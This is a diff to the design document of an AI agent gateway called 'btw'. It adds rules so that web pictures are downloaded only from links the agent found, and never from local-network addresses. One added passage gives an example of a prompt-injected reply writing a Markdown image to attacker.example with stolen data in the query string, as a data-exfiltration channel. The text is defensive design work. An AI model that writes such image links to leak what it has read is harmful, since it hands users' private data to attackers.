@@ -19,7 +19,7 @@ folder, skills and memory. The agent has a single tool, `run_command`.
 | Reasoning          | Chosen per conversation (`low` / `medium` / `high` / `xhigh` / `max`, default `medium`). It can be changed later, but on Claude that rebuilds the conversation's cache once.                                                                                                                                                                                                                                                                                  |
 | System prompt      | Built once when the conversation is created: instructions, the skills catalog and the contents of `MEMORY.md`. **It is never changed afterwards, and no update notices are added.** If memory or skills change in another conversation, this conversation only sees it by running commands.                                                                                                                                                                   |
 | Skills             | Follow [agentskills.io](https://agentskills.io/client-implementation/adding-skills-support). They are read from `~/.btw-agent/profiles/<slug>/skills`, `~/.agents/skills` and the skills that ship with btw (`packages/core/skills`, e.g. `automations`); a profile skill overrides a global one, and both override a built-in one with the same name. The agent loads a skill by running `cat` on its `SKILL.md`, and creates new ones with `btw skill new`. |
-| Pictures and files | The agent writes Markdown: `![alt](path or URL)` shows a picture, `[label](path)` hands over a file. The gateway copies each one, byte for byte, when the reply is saved, and the chat only ever loads those copies. There is no tool for it.                                                                                                                                                                                                                 |
+| Pictures and files | The agent writes Markdown: `![alt](path or URL)` shows a picture, `[label](path)` hands over a file. The gateway copies each one, byte for byte, when the reply is saved, and the chat only ever loads those copies. Web pictures only from links the agent found, never from the local network. There is no tool for it.                                                                                                                                     |
 | Web search         | Handled by a skill that uses the firecrawl CLI. The gateway has no code for it.                                                                                                                                                                                                                                                                                                                                                                               |
 
 ## Files on disk
@@ -185,9 +185,30 @@ cached prefix doesn't change.
   transaction. The chat keeps showing a picture after the original is moved, edited or was a
   temporary file, and background runs nobody opens for days keep theirs. The streamed reply stays
   on screen meanwhile; Stop aborts the copying.
+- **Web pictures only from links the agent found.** The gateway downloads them itself, so without
+  a rule a reply containing `![x](https://attacker.example/p.png?d=<something the agent read>)`
+  would hand that data to the attacker as soon as it's saved, and a prompt injection would only
+  have to get the model to write a picture, a lower bar than getting it to run `curl`. So a web
+  picture is downloaded only if its exact link appears earlier in the conversation, in what a
+  person wrote, an automation's prompt or event, or a command's output: the agent found the link
+  rather than built it (the rule of Anthropic's web fetch tool). The agent's own replies and
+  commands don't count; the match must be the whole link, not the start of a longer one; `&amp;`
+  and `\/` read as `&` and `/`, so links copied out of HTML and JSON match. Otherwise the row says
+  "Web pictures are shown only when btw found the link on a page or in a message", and the system
+  prompt tells the agent to download other pictures and show the file. This narrows the channel
+  rather than closing it: a reply can still choose which of the links it found to show, and a
+  command can print any link, but an agent that runs commands can already send anything with
+  `curl`.
+- **Never from this computer or the local network.** Downloads use Node's `http`/`https` with a
+  DNS lookup that refuses loopback, private, shared (CGNAT, Tailscale), link-local, multicast and
+  reserved addresses, and this computer's own addresses. Node calls it for each connection, so the
+  address checked is the one connected to (a name can't resolve to a public address for the check
+  and a local one for the connection). IP addresses in a link are checked before connecting, and
+  each redirect (up to 5) goes through the same checks.
 - **Limits:** 100 MB per file, 30 per reply. `config.json` and the database are never copied. A
   target that can't be copied gets a row with the reason in plain words (not found, a folder, too
-  large, not a picture, the download failed), which the chat shows in its place.
+  large, not a picture, a web link the agent didn't find, a local-network address, the download
+  failed), which the chat shows in its place.
 - **Types come from the content.** A picture is never recognized by its extension. HEIC and TIFF
   (and camera RAW files) also get a full-size JPEG copy for display, made with macOS's `sips`; the
   download is still the original. Elsewhere they are shown as downloads. Width and height (with
@@ -202,8 +223,8 @@ cached prefix doesn't change.
   picture (click to open a viewer with a Download button), a download card for files and for
   pictures browsers can't show, or a pulsing placeholder while the reply is still streaming.
   DOMPurify drops any other `<img>` source, `<style>`, inline styles, `srcset`, audio, video and SVG
-  images, so nothing in a reply loads from another site without a click and a prompt-injected reply
-  can't leak what it knows through an image URL.
+  images, so the browser never loads anything a reply names from another site without a click. The
+  gateway's own downloads are what the two rules above guard.
 - **Cleanup:** `media` rows go with their conversation. The scheduler's hourly prune deletes stored
   files that no row points to any more and that are over an hour old (so a copy about to be saved
   is safe). Identical files are stored once.
